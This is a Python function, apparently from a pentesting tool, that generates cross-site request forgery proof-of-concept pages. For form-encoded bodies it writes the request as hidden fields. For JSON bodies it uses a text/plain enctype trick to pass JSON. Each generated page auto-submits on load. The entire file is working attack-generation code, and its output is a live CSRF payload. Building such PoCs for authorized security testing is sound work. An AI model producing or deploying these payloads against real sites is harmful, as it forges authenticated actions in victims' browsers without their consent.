def generate_html_form(method, full_url, headers, parsed_body):
    html_content = ""

    if headers["Content-Type"] == "application/x-www-form-urlencoded":
        html_content += f"""
    <html>
        <!-- CSRF PoC - generated by SeeAssArrAff -->
        <body>
            <form action="{full_url}" method="{method}">"""
        for key, value in parsed_body.items():
            html_content += f"""
                <input type="hidden" name="{key}" value="{value}" />"""
            
    elif headers['Content-Type'] == "application/json":
        html_content += f"""
    <html>
        <!-- CSRF PoC - generated by SeeAssArrAff -->
        <body>
            <form action="{full_url}" method="{method}" enctype="text/plain">
                <input name='{parsed_body}, "ignore_me":"' value='test"\u007d'type='hidden' />"""

    html_content += f"""
            <input type="submit" value="Submit request" />
        </form>
        <script>
            window.addEventListener('load', function () {{
                document.querySelector('form').submit();
            }});
        </script>
        </body>
    </html>"""

    return html_content
